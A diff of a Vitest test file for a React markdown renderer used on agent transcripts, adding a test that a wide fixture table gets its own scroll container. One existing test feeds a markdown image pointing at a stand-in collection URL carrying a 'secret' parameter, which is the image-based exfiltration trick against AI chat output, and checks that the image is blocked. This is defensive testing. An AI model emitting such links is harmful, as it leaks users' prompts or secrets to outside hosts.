@@ -1,6 +1,7 @@
 import { expect, it } from 'vitest'
 import { renderToStaticMarkup } from 'react-dom/server'
 import { MessageMarkdown } from './MessageMarkdown'
+import { wideTableAnswer } from './fixtures/scenarios'
 
 it('does not auto-load remote images from an agent transcript', () => {
   const html = renderToStaticMarkup(<MessageMarkdown text={'![private screenshot](https://example.invalid/collect?secret=prompt)'} />)
@@ -27,4 +28,12 @@ it('keeps inline code free of block controls and machine translation', () => {
 it('lets a wide table scroll on its own', () => {
   const html = renderToStaticMarkup(<MessageMarkdown text={'| a | b |\n| - | - |\n| 1 | 2 |'} />)
   expect(html).toMatch(/<div[^>]*data-scroll="x"[^>]*><table/)
+})
+it('wraps the twelve-column fixture table in its own scroll container', () => {
+  const html = renderToStaticMarkup(<MessageMarkdown text={wideTableAnswer} />)
+  expect(html.match(/<table/g)).toHaveLength(1)
+  expect(html).toMatch(/<div[^>]*data-scroll="x"[^>]*><table>/)
+  expect(html).toMatch(/<\/table><\/div>/)
+  const header = /<thead>(.*?)<\/thead>/.exec(html)?.[1] ?? ''
+  expect(header.match(/<th[ >]/g)?.length).toBeGreaterThanOrEqual(12)
 })
